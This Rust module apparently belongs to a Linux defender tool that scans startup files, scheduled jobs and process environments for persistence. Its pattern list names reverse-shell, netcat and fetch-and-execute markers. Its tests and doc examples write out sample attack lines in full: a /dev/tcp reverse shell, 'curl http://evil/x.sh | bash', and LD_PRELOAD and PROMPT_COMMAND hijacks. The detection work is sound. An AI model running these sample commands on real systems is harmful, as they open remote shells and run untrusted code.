//! Shared helpers for reading configuration and flagging dangerous content.
//!
//! The anti-persistence checks mostly follow the same shape: read some config,
//! decide which parts are suspicious, show the operator, offer to act. The
//! detection half lives here so it can be tested without touching the system.

use std::fs;
use std::path::{Path, PathBuf};

use walkdir::WalkDir;

/// Substrings that are rarely legitimate inside a config file, startup script,
/// or scheduled job, paired with why they matter.
///
/// Deliberately specific: a check that flags every `curl` in every dotfile
/// wastes an operator's time during a competition. These are patterns that
/// indicate fetch-and-execute, reverse shells, obfuscation, or privilege
/// retention rather than ordinary administration.
pub const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
    ("/dev/tcp/", "bash network redirection (reverse shell)"),
    ("/dev/udp/", "bash network redirection (reverse shell)"),
    ("bash -i", "spawns an interactive shell"),
    ("sh -i", "spawns an interactive shell"),
    ("nc -e", "netcat command execution"),
    ("ncat -e", "netcat command execution"),
    ("netcat -e", "netcat command execution"),
    ("mkfifo", "named pipe, common in reverse shells"),
    ("base64 -d", "base64 decoding (obfuscation)"),
    ("base64 --decode", "base64 decoding (obfuscation)"),
    ("| sh", "pipes output into a shell"),
    ("|sh", "pipes output into a shell"),
    ("| bash", "pipes output into a shell"),
    ("|bash", "pipes output into a shell"),
    ("python -c", "inline interpreter payload"),
    ("python3 -c", "inline interpreter payload"),
    ("perl -e", "inline interpreter payload"),
    ("ruby -e", "inline interpreter payload"),
    ("php -r", "inline interpreter payload"),
    ("chmod +s", "sets the setuid bit"),
    ("chmod u+s", "sets the setuid bit"),
    ("chmod 4755", "sets the setuid bit"),
    ("chattr +i", "makes a file immutable"),
    ("chmod 777", "world-writable permission (dropper staging)"),
    ("setsid", "detaches from the controlling terminal"),
    ("curl", "fetches remote content"),
    ("wget", "fetches remote content"),
    (
        "crontab -",
        "writes crontab from stdin (persistence bootstrapping)",
    ),
    (
        "at now",
        "schedules a one-shot job immediately (at job persistence)",
    ),
    ("| at ", "pipes command into at scheduler"),
    ("|at ", "pipes command into at scheduler"),
    (
        "systemctl enable",
        "enables a service at boot (persistence installation)",
    ),
    // Shell-poison function overrides -- any bash function that shadows a security-critical
    // command blocks defenders from using it during an incident.
    ("passwd ()", "bash function overrides security command"),
    ("passwd()", "bash function overrides security command"),
    ("chpasswd ()", "bash function overrides security command"),
    ("chpasswd()", "bash function overrides security command"),
    ("chattr ()", "bash function overrides security command"),
    ("chattr()", "bash function overrides security command"),
    ("userdel ()", "bash function overrides security command"),
    ("userdel()", "bash function overrides security command"),
    ("systemctl ()", "bash function overrides security command"),
    ("systemctl()", "bash function overrides security command"),
    ("rm ()", "bash function overrides security command"),
    ("rm()", "bash function overrides security command"),
    ("chmod ()", "bash function overrides security command"),
    ("chmod()", "bash function overrides security command"),
    ("kill ()", "bash function overrides security command"),
    ("kill()", "bash function overrides security command"),
    ("iptables ()", "bash function overrides security command"),
    ("iptables()", "bash function overrides security command"),
    ("adduser ()", "bash function overrides security command"),
    ("adduser()", "bash function overrides security command"),
];

/// Directories that no legitimate system config should execute out of.
pub const UNTRUSTED_EXEC_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/home/"];

/// Distinct reasons `text` looks suspicious. Empty means nothing matched.
///
/// Reasons are deduplicated, so three different `chmod` spellings that all
/// mean "sets the setuid bit" report that once.
///
/// # Examples
///
/// ```
/// use linux_defender::core::scan::suspicious_matches;
///
/// // Ordinary configuration raises nothing.
/// assert!(suspicious_matches("export PATH=$PATH:/usr/local/bin").is_empty());
///
/// // A reverse shell is explained, not merely flagged.
/// let reasons = suspicious_matches("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
/// assert!(reasons.contains(&"bash network redirection (reverse shell)"));
/// assert!(reasons.contains(&"spawns an interactive shell"));
/// ```
pub fn suspicious_matches(text: &str) -> Vec<&'static str> {
    let lowered = text.to_lowercase();
    let mut reasons: Vec<&'static str> = SUSPICIOUS_PATTERNS
        .iter()
        .filter(|(needle, _)| lowered.contains(needle))
        .map(|(_, why)| *why)
        .collect();

    reasons.dedup();
    reasons.sort_unstable();
    reasons.dedup();
    reasons
}

/// Reasons that are common in legitimate config and so are never, on their
/// own, enough to auto-remove anything. A stock certbot cron runs `perl -e`,
/// health checks `curl`, backup jobs live in `/home`. A hit made only of these
/// is reported for review; removal needs at least one reason not listed here.
pub const WEAK_REASONS: &[&str] = &[
    "base64 decoding (obfuscation)",
    "inline interpreter payload",
    "makes a file immutable",
    "world-writable permission (dropper staging)",
    "detaches from the controlling terminal",
    "fetches remote content",
    "schedules a one-shot job immediately (at job persistence)",
    "pipes command into at scheduler",
    "enables a service at boot (persistence installation)",
    // module-specific extras
    "nohup background",
    "chmod +x",
    "background execution detached from terminal",
    "make-executable (stage two of a dropper)",
    "execution from a home directory",
];

/// True when `reason` is strong enough to justify automatic removal.
pub fn is_strong_reason(reason: &str) -> bool {
    !WEAK_REASONS.contains(&reason)
}

/// True when any of `reasons` is strong (see [`WEAK_REASONS`]).
pub fn has_strong_reason<S: AsRef<str>>(reasons: &[S]) -> bool {
    reasons.iter().any(|r| is_strong_reason(r.as_ref()))
}

/// Volatile, world-writable directories nothing legitimate executes from.
pub const VOLATILE_EXEC_DIRS: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];

/// True when `text` references a [`VOLATILE_EXEC_DIRS`] path.
pub fn references_volatile_dir(text: &str) -> bool {
    VOLATILE_EXEC_DIRS.iter().any(|dir| text.contains(dir))
}

/// True when `text` runs netcat (`nc`, `ncat`, `netcat`) as a command, as
/// opposed to merely containing the letters "nc -" (`rsync -a`, `sync -f`).
pub fn invokes_netcat(text: &str) -> bool {
    text.split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`'))
        .map(|tok| tok.trim_matches(|c| c == '\'' || c == '"'))
        .map(|tok| tok.rsplit('/').next().unwrap_or(tok))
        .any(|cmd| {
            matches!(
                cmd,
                "nc" | "ncat" | "netcat" | "nc.traditional" | "nc.openbsd"
            )
        })
}

/// Whether `text` references an executable under a world-writable directory.
///
/// # Examples
///
/// ```
/// use linux_defender::core::scan::references_untrusted_dir;
///
/// assert!(references_untrusted_dir(r#"RUN+="/tmp/payload""#));
/// assert!(!references_untrusted_dir(r#"RUN+="/usr/bin/logger""#));
/// ```
pub fn references_untrusted_dir(text: &str) -> bool {
    UNTRUSTED_EXEC_DIRS.iter().any(|dir| text.contains(dir))
}

/// Trim surrounding whitespace, returning `None` for lines that carry no
/// directive at all — blanks and whole-line `#` or `;` comments.
///
/// # Examples
///
/// ```
/// use linux_defender::core::scan::effective_line;
///
/// assert_eq!(effective_line("  exit 0  "), Some("exit 0"));
/// assert_eq!(effective_line("# installed by the admin"), None);
/// assert_eq!(effective_line("   "), None);
/// ```
pub fn effective_line(line: &str) -> Option<&str> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with(';') {
        return None;
    }
    Some(trimmed)
}

/// Read every regular file under `dir` as UTF-8 text, sorted by path.
///
/// A missing directory yields an empty list; unreadable and non-UTF-8 files
/// are skipped rather than failing the whole check.
pub fn read_text_files(dir: &Path) -> Vec<(PathBuf, String)> {
    let mut files: Vec<(PathBuf, String)> = WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().is_file())
        .filter_map(|e| read_text_file(e.path()).map(|contents| (e.path().to_path_buf(), contents)))
        .collect();

    files.sort_by(|a, b| a.0.cmp(&b.0));
    files
}

/// Largest prefix of a file the scanners will read. Config files are tiny; an
/// attacker-planted multi-gigabyte file must not exhaust memory.
pub const MAX_SCAN_READ: u64 = 16 * 1024 * 1024;

/// Open `path` without blocking and return it with its metadata.
///
/// `O_NONBLOCK` matters for FIFOs: a plain `open` on a named pipe blocks until
/// a writer appears, which an attacker can arrange never to happen, hanging
/// the scan forever. Symlinks are followed, as config paths often are links.
pub fn open_nonblocking(path: &Path) -> std::io::Result<(fs::File, fs::Metadata)> {
    use std::os::unix::fs::OpenOptionsExt;
    let file = fs::OpenOptions::new()
        .read(true)
        .custom_flags(libc::O_NONBLOCK)
        .open(path)?;
    let meta = file.metadata()?;
    Ok((file, meta))
}

/// Read at most `max` bytes of `path`, refusing anything but a regular file
/// (FIFOs, sockets, devices and directories are errors).
pub fn read_regular_file(path: &Path, max: u64) -> std::io::Result<Vec<u8>> {
    use std::io::Read;
    let (file, meta) = open_nonblocking(path)?;
    if !meta.file_type().is_file() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("{} is not a regular file", path.display()),
        ));
    }
    let mut buf = Vec::with_capacity(meta.len().min(max) as usize);
    file.take(max).read_to_end(&mut buf)?;
    Ok(buf)
}

/// Shell startup files where an exported variable would take effect for
/// every session: system-wide files, `/etc/profile.d`, `/etc/environment`,
/// `/etc/skel`, and the dotfiles of every account that can log in.
pub fn shell_startup_files() -> Vec<PathBuf> {
    let mut files: Vec<PathBuf> = [
        "/etc/environment",
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/bashrc",
        "/etc/zsh/zshrc",
        "/etc/zshrc",
        "/etc/zsh/zshenv",
    ]
    .iter()
    .map(PathBuf::from)
    .collect();
    for dir in ["/etc/profile.d", "/etc/skel"] {
        if let Ok(entries) = fs::read_dir(dir) {
            files.extend(entries.flatten().map(|e| e.path()));
        }
    }
    if let Ok(accounts) = crate::core::collect_accounts() {
        for account in accounts.iter().filter(|a| a.can_log_in()) {
            for name in [
                ".bashrc",
                ".bash_profile",
                ".bash_login",
                ".profile",
                ".zshrc",
                ".zshenv",
                ".pam_environment",
            ] {
                files.push(account.home.join(name));
            }
        }
    }
    files
}

/// Lines in `text` that assign `var` (`VAR=`, `VAR+=`, `export VAR=`,
/// `declare -x VAR=`, or `VAR DEFAULT=` in pam_environment).
pub fn variable_assignments(text: &str, var: &str) -> Vec<String> {
    text.lines()
        .filter_map(effective_line)
        .filter(|line| {
            line.split(|c: char| c.is_whitespace() || c == ';')
                .any(|tok| {
                    tok.strip_prefix(var)
                        .is_some_and(|rest| rest.starts_with('=') || rest.starts_with("+="))
                })
                || line.split_whitespace().next() == Some(var) && line.contains("DEFAULT=")
        })
        .map(str::to_string)
        .collect()
}

/// Non-empty values of `var` in the environment of running processes, as
/// `(pid, command name, value)`. This sees what users' shells actually run
/// with, which the defender's own (sudo-scrubbed) environment never does.
pub fn process_env_values(var: &str) -> Vec<(u32, String, String)> {
    let prefix = format!("{var}=");
    let me = std::process::id();
    let Ok(entries) = fs::read_dir("/proc") else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for entry in entries.flatten() {
        let Some(pid) = entry
            .file_name()
            .to_str()
            .and_then(|n| n.parse::<u32>().ok())
        else {
            continue;
        };
        if pid == me {
            continue;
        }
        let Ok(environ) = fs::read(entry.path().join("environ")) else {
            continue;
        };
        for kv in environ.split(|b| *b == 0) {
            let kv = String::from_utf8_lossy(kv);
            if let Some(value) = kv.strip_prefix(&prefix)
                && !value.trim().is_empty()
            {
                let comm = fs::read_to_string(entry.path().join("comm"))
                    .map(|c| c.trim().to_string())
                    .unwrap_or_default();
                out.push((pid, comm, value.to_string()));
            }
        }
    }
    out
}

/// Report where `var` is set: startup files that assign it and running
/// processes that carry it. `module` names the findings; `why` explains the
/// risk. Returns the number of findings emitted.
pub fn report_variable(
    ctx: &crate::core::DefenderContext,
    module: &'static str,
    var: &str,
    why: &str,
) -> usize {
    use crate::core::{Action, Finding, Severity, Verdict};
    let mut count = 0;

    for file in shell_startup_files() {
        let Some(text) = read_text_file(&file) else {
            continue;
        };
        for line in variable_assignments(&text, var) {
            let reasons = suspicious_matches(&line);
            let severity = if reasons.is_empty() {
                Severity::Medium
            } else {
                Severity::High
            };
            ctx.emit(
                Finding::new(
                    severity,
                    module,
                    format!("{var} set in {}: {}", file.display(), line),
                    format!(
                        "file: {}\nline: {}\npatterns: {}",
                        file.display(),
                        line,
                        reasons.join(", ")
                    ),
                )
                .with_path(file.clone())
                .with_verdict(Verdict::Investigate, why.to_string())
                .with_action(Action::Manual(format!(
                    "remove the {var} line from {}",
                    file.display()
                ))),
            );
            count += 1;
        }
    }

    // Group running processes by value so one hijacked login does not flood
    // the findings list.
    let mut by_value: std::collections::BTreeMap<String, Vec<String>> = Default::default();
    for (pid, comm, value) in process_env_values(var) {
        by_value
            .entry(value)
            .or_default()
            .push(format!("{pid} ({comm})"));
    }
    for (value, procs) in by_value {
        ctx.emit(
            Finding::new(
                Severity::High,
                module,
                format!(
                    "{var} is set in {} running process(es): {}",
                    procs.len(),
                    value
                ),
                format!("value: {}\nprocesses: {}", value, procs.join(", ")),
            )
            .with_verdict(
                Verdict::Investigate,
                format!(
                    "{why} Find where it is exported, remove it, and restart the \
                     affected sessions or services."
                ),
            )
            .with_action(Action::Manual(format!("grep -r {var} /etc /home /root"))),
        );
        count += 1;
    }

    count
}

/// Read a single file as text, treating "missing" and "unreadable" alike.
pub fn read_text_file(path: &Path) -> Option<String> {
    String::from_utf8(read_regular_file(path, MAX_SCAN_READ).ok()?).ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn netcat_detection_needs_the_command_not_a_substring() {
        assert!(invokes_netcat("nc -e /bin/sh 1.2.3.4 9"));
        assert!(invokes_netcat("x; /usr/bin/ncat 1.2.3.4 9"));
        assert!(invokes_netcat("mkfifo f; cat f|nc -l 4444"));
        assert!(!invokes_netcat("rsync -a /srv /backup"));
        assert!(!invokes_netcat("sync -f /"));
        assert!(!invokes_netcat("/usr/bin/rpcinfo"));
    }

    #[test]
    fn weak_reasons_alone_are_not_strong() {
        assert!(!has_strong_reason(&suspicious_matches(
            "perl -e 'sleep int(rand(43200))' && certbot -q renew"
        )));
        assert!(!has_strong_reason(&suspicious_matches(
            "*/5 * * * * curl -fsS https://hc.example/ping"
        )));
        assert!(has_strong_reason(&suspicious_matches(
            "curl http://evil/x.sh | bash"
        )));
        assert!(has_strong_reason(&suspicious_matches(
            "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"
        )));
    }

    #[test]
    fn fifos_and_directories_are_refused_without_blocking() {
        let dir = tempfile::TempDir::new().unwrap();
        let fifo = dir.path().join(".hidden_pipe");
        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
        // SAFETY: valid NUL-terminated path, plain mkfifo call.
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        // Would hang forever with a blocking open and no writer.
        assert!(read_regular_file(&fifo, 1024).is_err());
        assert!(read_text_file(&fifo).is_none());
        assert!(read_regular_file(dir.path(), 1024).is_err());
    }

    #[test]
    fn reads_are_capped() {
        let dir = tempfile::TempDir::new().unwrap();
        let big = dir.path().join("big");
        fs::write(&big, vec![b'a'; 4096]).unwrap();
        assert_eq!(read_regular_file(&big, 100).unwrap().len(), 100);
    }

    #[test]
    fn variable_assignments_find_exports_but_not_mentions() {
        let text = "\
export PROMPT_COMMAND='curl -s http://x | sh'
PROMPT_COMMAND+=\"; history -a\"
declare -x LD_PRELOAD=/lib/x.so
# PROMPT_COMMAND=commented
echo $PROMPT_COMMAND
MY_PROMPT_COMMAND=fine
LD_PRELOAD DEFAULT=/tmp/evil.so
";
        let pc = variable_assignments(text, "PROMPT_COMMAND");
        assert_eq!(pc.len(), 2, "{pc:?}");
        let ld = variable_assignments(text, "LD_PRELOAD");
        assert_eq!(ld.len(), 2, "{ld:?}");
    }

    #[test]
    fn clean_text_matches_nothing() {
        assert!(suspicious_matches("export PATH=$PATH:/usr/local/bin").is_empty());
    }

    #[test]
    fn detects_a_reverse_shell() {
        let reasons = suspicious_matches("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(reasons.contains(&"bash network redirection (reverse shell)"));
        assert!(reasons.contains(&"spawns an interactive shell"));
    }

    #[test]
    fn detects_fetch_and_execute() {
        let reasons = suspicious_matches("curl http://evil.test/x.sh | bash");
        assert!(reasons.contains(&"fetches remote content"));
        assert!(reasons.contains(&"pipes output into a shell"));
    }

    #[test]
    fn matching_is_case_insensitive() {
        assert!(!suspicious_matches("BASE64 --DECODE").is_empty());
    }

    #[test]
    fn reasons_are_deduplicated() {
        // Three separate needles all map to the setuid reason.
        let reasons = suspicious_matches("chmod +s a; chmod u+s b; chmod 4755 c");
        assert_eq!(
            reasons
                .iter()
                .filter(|r| **r == "sets the setuid bit")
                .count(),
            1
        );
    }

    #[test]
    fn detects_shell_poison_function_override_spaced() {
        let reasons = suspicious_matches("passwd () {");
        assert!(reasons.contains(&"bash function overrides security command"));
    }

    #[test]
    fn detects_shell_poison_function_override_compact() {
        let reasons = suspicious_matches("chattr() {");
        assert!(reasons.contains(&"bash function overrides security command"));
    }

    #[test]
    fn detects_shell_poison_systemctl_override() {
        let reasons = suspicious_matches("systemctl () { echo 'blocked' ; }");
        assert!(reasons.contains(&"bash function overrides security command"));
    }

    #[test]
    fn multiple_overrides_deduplicated_to_one_reason() {
        let reasons = suspicious_matches("passwd () { true; }; userdel () { true; }");
        assert_eq!(
            reasons
                .iter()
                .filter(|r| **r == "bash function overrides security command")
                .count(),
            1
        );
    }

    #[test]
    fn flags_execution_out_of_world_writable_directories() {
        assert!(references_untrusted_dir("RUN+=\"/tmp/payload\""));
        assert!(references_untrusted_dir("/dev/shm/x"));
        assert!(!references_untrusted_dir("/usr/bin/systemctl"));
    }

    #[test]
    fn effective_line_skips_comments_and_blanks() {
        assert_eq!(effective_line("  exit 0 "), Some("exit 0"));
        assert_eq!(effective_line("# comment"), None);
        assert_eq!(effective_line("; also a comment"), None);
        assert_eq!(effective_line("   "), None);
    }
}
